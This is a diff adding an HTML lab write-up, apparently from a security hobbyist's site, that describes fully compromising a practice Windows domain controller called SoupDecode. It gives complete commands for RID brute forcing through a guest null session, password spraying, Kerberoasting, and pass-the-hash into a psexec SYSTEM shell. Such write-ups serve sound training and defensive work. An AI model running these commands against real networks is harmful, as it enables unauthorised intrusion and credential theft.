@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Report: SoupDecode | Operator</title>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500&family=Inter:wght@400;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root { --bg: #05070a; --accent: #00ff9d; --accent-blue: #00d4ff; --text-main: #e6edf3; --text-dim: #8b949e; --glass-border: rgba(255, 255, 255, 0.1); }
+        body { background-color: var(--bg); color: var(--text-main); font-family: 'Inter', sans-serif; margin: 0; line-height: 1.6; }
+        .container { max-width: 800px; margin: 0 auto; padding: 4rem 2rem; }
+        .back-link { font-family: 'Fira Code', monospace; color: var(--accent); text-decoration: none; font-size: 0.9rem; }
+        h1 { font-size: 2.5rem; margin: 1rem 0; color: #fff; }
+        .meta { font-family: 'Fira Code', monospace; font-size: 0.8rem; color: var(--text-dim); margin-bottom: 3rem; border-bottom: 1px solid var(--glass-border); padding-bottom: 1rem; }
+        h2 { color: var(--accent); font-family: 'Fira Code', monospace; font-size: 1.2rem; text-transform: uppercase; margin-top: 3rem; }
+        pre { background: #000; border: 1px solid var(--glass-border); padding: 1.5rem; border-radius: 8px; overflow-x: auto; font-family: 'Fira Code', monospace; font-size: 0.85rem; color: #fff; }
+        code { color: var(--accent-blue); font-family: 'Fira Code', monospace; background: rgba(0, 212, 255, 0.1); padding: 2px 4px; border-radius: 4px; }
+        .summary-box { background: rgba(0, 255, 157, 0.05); border-left: 4px solid var(--accent); padding: 1.5rem; margin: 2rem 0; }
+        footer { margin-top: 4rem; padding-top: 2rem; border-top: 1px solid var(--glass-border); text-align: center; font-family: 'Fira Code', monospace; color: var(--text-dim); font-size: 0.8rem; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="labs.html" class="back-link"><- BACK_TO_ARCHIVE</a>
+        <h1>SoupDecode: Full Domain Compromise</h1>
+        <div class="meta">TARGET: Windows Server 2022 DC // STATUS: COMPROMISED // AUTHOR: Operator</div>
+
+        <section>
+            <h2>0x01_Reconnaissance</h2>
+            <p>The operation began with an <code>nmap</code> scan to identify the attack surface. The target was identified as a Windows Domain Controller running <code>SOUPEDECODE.LOCAL</code>.</p>
+            <pre>nmap -sC -sV 10.49.167.13 -oA nmap/soupedecode_01</pre>
+        </section>
+
+        <section>
+            <h2>0x02_Initial_Foothold</h2>
+            <p>I identified that the <code>guest</code> account was enabled with a blank password. This allowed for an IPC$ null session, which I leveraged for a RID Brute Force attack to harvest valid domain usernames.</p>
+            <pre>nxc smb 10.49.167.13 -u 'guest' -p '' --rid-brute</pre>
+        </section>
+
+        <section>
+            <h2>0x03_Credential_Access</h2>
+            <p>After a failed AS-REP roasting attempt, I executed a password spray (username = password). The account <code>ybob317</code> was successfully compromised.</p>
+            <pre>nxc smb 10.49.167.13 -u users.txt -p users.txt --no-brute --continue-on-success</pre>
+        </section>
+
+        <section>
+            <h2>0x04_Privilege_Escalation</h2>
+            <p>Using <code>ybob317</code>, I performed Kerberoasting and cracked the password for <code>file_svc</code>. This service account had read access to a <code>backup</code> share containing <code>backup_extract.txt</code>—a goldmine of machine account NT hashes.</p>
+            <pre>impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 10.49.167.13 -request</pre>
+        </section>
+
+        <section>
+            <h2>0x05_Domain_Takeover</h2>
+            <p>By executing a Pass-the-Hash (PtH) attack using the <code>FileServer$</code> hash, I gained administrative access to the DC and spawned a SYSTEM shell via <code>psexec</code>.</p>
+            <pre>impacket-psexec SOUPEDECODE.LOCAL/'FileServer$'@10.49.167.13 -hashes :e41da7e79a4c76dbd9cf79d1cb325559</pre>
+        </section>
+
+        <div class="summary-box">
+            <strong>KEY_TAKEAWAY:</strong> This attack chain demonstrates how a single misconfiguration (Guest IPC$ access) and a weak service account password can cascade into a full Active Directory compromise without using any exploits.
+        </div>
+
+        <footer>RECORDS_v1.0.8 // PENTEST_COMPLETE</footer>
+    </div>
+</body>
+</html>
